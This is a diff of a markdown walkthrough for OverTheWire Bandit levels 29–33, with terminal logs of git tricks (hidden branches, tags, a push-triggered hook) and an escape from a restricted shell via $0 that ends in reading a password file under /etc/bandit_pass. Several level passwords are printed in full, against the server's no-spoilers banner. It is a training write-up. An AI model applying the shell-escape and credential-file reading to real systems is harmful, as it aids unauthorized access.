+└─$ git branch -r
+  origin/HEAD -> origin/master
+  origin/dev
+  origin/master
+  origin/sploits-dev
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw/repo]
+└─$ git log      
+commit 921cad124cfe5b4ba9f648de1894f75656ff0ff4 (HEAD -> master, origin/master, origin/HEAD)
+Author: Ben Dover <noone@overthewire.org>
+Date:   Fri Apr 3 15:17:56 2026 +0000
+
+    fix username
+
+commit edd6383ec473cb45c7f620ad3d762f31ebbc41ea
+Author: Ben Dover <noone@overthewire.org>
+Date:   Fri Apr 3 15:17:56 2026 +0000
+
+    initial commit of README.md
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw/repo]
+└─$ git checkout dev                                                                    
+branch 'dev' set up to track 'origin/dev'.
+Switched to a new branch 'dev'
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw/repo]
+└─$ ls
+README.md  code
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw/repo]
+└─$ cat README.md
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
 
 ```
 
 ### Commands used to solve this level
 ```bash
-nc localhost 30000
+git branch
+git branch -r
 ```
 
 ### Note: 
+Bandit 29 is solved by cloning a Git repository and discovering that the default master branch does not contain the password. By listing all remote branches using git branch -r, you find additional branches such as dev. Switching to the dev branch using git checkout reveals a different version of the repository where the README file contains the actual password for the next level. This level demonstrates how Git branches can store alternative versions of a project, including hidden or unintended data.
+
 
 ---
 
 
 ## Bandit 30
 ### Level Goal
-The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
-Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.
+There is a git repository at ssh://bandit30-git@bandit.labs.overthewire.org/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~]
+└─$ mktemp -d
+/tmp/tmp.KiC4H9dIyZ
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[~]
+└─$ cd /tmp/tmp.KiC4H9dIyZ
+
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.KiC4H9dIyZ]
+└─$ git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo
+Cloning into 'repo'...
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit30-git@bandit.labs.overthewire.org's password: 
+remote: Enumerating objects: 4, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (4/4), done.
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.KiC4H9dIyZ]
+└─$ ls
+repo
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.KiC4H9dIyZ]
+└─$ cd repo               
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.KiC4H9dIyZ/repo]
+└─$ ls
+README.md
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.KiC4H9dIyZ/repo]
+└─$ cat README.md
+just an epmty file... muahaha
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.KiC4H9dIyZ/repo]
+└─$ git log                                                                             
+commit bd393e0e59a075f92fd84edc0ad8d13f64572de2 (HEAD -> master, origin/master, origin/HEAD)
+Author: Ben Dover <noone@overthewire.org>
+Date:   Fri Apr 3 15:17:58 2026 +0000
+
+    initial commit of README.md
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.KiC4H9dIyZ/repo]
+└─$ git branch -r
+  origin/HEAD -> origin/master
+  origin/master
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.KiC4H9dIyZ/repo]
+└─$ git tag      
+secret
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.KiC4H9dIyZ/repo]
+└─$ git show secret
+fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
 
 ```
 
 ### Commands used to solve this level
 ```bash
-nc localhost 30000
+git tag
+git show secret
 ```
 
 ### Note: 
+Bandit 30 is solved by cloning a Git repository where neither the README, commit history, nor branches contain useful information. However, by inspecting Git tags using git tag, you discover a tag named secret. Using git show on this tag reveals the hidden password for the next level. This demonstrates how Git tags, which are often overlooked compared to branches and commits, can still reference important or sensitive data.
+
 
 ---
 
 
 ## Bandit 31
 ### Level Goal
-The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
-Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.
+There is a git repository at ssh://bandit31-git@bandit.labs.overthewire.org/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~]
+└─$ mktemp -d
+/tmp/tmp.uZBfMwGRvi
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[~]
+└─$ cd /tmp/tmp.uZBfMwGRvi
+
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi]
+└─$ git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
+
+Cloning into 'repo'...
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit31-git@bandit.labs.overthewire.org's password: 
+remote: Enumerating objects: 4, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (3/3), done.
+remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (4/4), done.
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi]
+└─$ ls
+repo
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi]
+└─$ cd repo               
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ ls
+README.md
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ cat README.md
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ ls -lia
+total 8
+806 drwxrwxr-x 3 incognito incognito 100 Apr 10 23:54 .
+805 drwx------ 3 incognito incognito  60 Apr 10 23:54 ..
+807 drwxrwxr-x 8 incognito incognito 260 Apr 10 23:54 .git
+868 -rw-rw-r-- 1 incognito incognito   6 Apr 10 23:54 .gitignore
+869 -rw-rw-r-- 1 incognito incognito 147 Apr 10 23:54 README.md
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ git config --global user.email "test@bandit.com"
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ git config --global user.name "bandit"
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ git rm .gitignore
+rm '.gitignore'
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ echo "May I come in?" > key.txt
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ git add key.txt
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ ls -lia
+total 8
+806 drwxrwxr-x 3 incognito incognito 100 Apr 10 23:56 .
+805 drwx------ 3 incognito incognito  60 Apr 10 23:54 ..
+807 drwxrwxr-x 8 incognito incognito 260 Apr 10 23:56 .git
+869 -rw-rw-r-- 1 incognito incognito 147 Apr 10 23:54 README.md
+872 -rw-rw-r-- 1 incognito incognito  15 Apr 10 23:56 key.txt
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ git status     
+On branch master
+Your branch is up to date with 'origin/master'.
+
+Changes to be committed:
+  (use "git restore --staged <file>..." to unstage)
+        deleted:    .gitignore
+        new file:   key.txt
+
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ git commit -m "add key.txt"
+[master 8bf8a9e] add key.txt
+ 2 files changed, 1 insertion(+), 1 deletion(-)
+ delete mode 100644 .gitignore
+ create mode 100644 key.txt
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.uZBfMwGRvi/repo]
+└─$ git push origin master
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit31-git@bandit.labs.overthewire.org's password: 
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 280 bytes | 280.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+remote: ### Attempting to validate files... ####
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote: 
+remote: Well done! Here is the password for the next level:
+remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K 
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote: 
+To ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo
+ ! [remote rejected] master -> master (pre-receive hook declined)
+error: failed to push some refs to 'ssh://bandit.labs.overthewire.org:2220/home/bandit31-git/repo'
+                                                                                                                                                  
 
 ```
 
 ### Commands used to solve this level
 ```bash
-nc localhost 30000
+git config --global user.email "test@bandit.com"
+git config --global user.name "bandit"
+git rm .gitignore
+echo "May I come in?" > key.txt
+git add key.txt
+git status
+git commit -m "add key.txt"
+git push origin master
 ```
 
 ### Note: 
+Bandit 31 is solved by cloning a Git repository that requires you to push a specific file to the remote server. The repository includes a .gitignore file that initially blocks .txt files, so it must be removed before the required file can be added. After configuring Git identity and creating a file named key.txt with the exact content “May I come in?”, the file is staged, committed, and pushed to the remote repository. The remote server then validates the pushed commit using a server-side hook (pre-receive hook), which checks whether the correct file and content were submitted. If the conditions are met, the server prints the password for the next level before rejecting the push operation, confirming success.
+
 
 ---
 
 ## Bandit 32
 ### Level Goal
-The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
-Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.
+After all this git stuff, it’s time for another escape. Good luck!
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~]
+└─$ ssh -p 2220 bandit32@bandit.labs.overthewire.org
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit32@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+WELCOME TO THE UPPERCASE SHELL
+>> $0
+$ which bash
+/usr/bin/bash
+$ cat /etc/bandit_pass/bandit33
+tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
+$ exit
+>> ^CConnection to bandit.labs.overthewire.org closed.
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[~]
+└─$ 
 
 ```
 
 ### Commands used to solve this level
 ```bash
-nc localhost 30000
+$0
+which bash
 ```
 
 ### Note: 
+Bandit 32 places you inside a restricted uppercase shell that limits normal command execution. However, by using $0, which references the current shell executable, you can spawn a new instance of the underlying shell (typically bash). This effectively breaks out of the restricted environment and restores normal command functionality. Once in the normal shell, you can simply read the password file located at /etc/bandit_pass/bandit33. This challenge demonstrates how weak shell restrictions can often be bypassed using environment variables and shell behavior.
+
 
 ---
+
+## Bandit 33
+### Ececution Log
+```bash
+┌──(incognito㉿kali)-[~]
+└─$ ssh -p 2220 bandit33@bandit.labs.overthewire.org
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit33@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+bandit33@bandit:~$ ls
+README.txt
+bandit33@bandit:~$ cat README.txt 
+Congratulations on solving the last level of this game!
+
+At this moment, there are no more levels to play in this game. However, we are constantly working
+on new levels and will most likely expand this game with more levels soon.
+Keep an eye out for an announcement on our usual communication channels!
+In the meantime, you could play some of our other wargames.
+
+If you have an idea for an awesome new level, please let us know!
+bandit33@bandit:~$ exit
+logout
+Connection to bandit.labs.overthewire.org closed.
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[~]
+└─$ 
+
+```
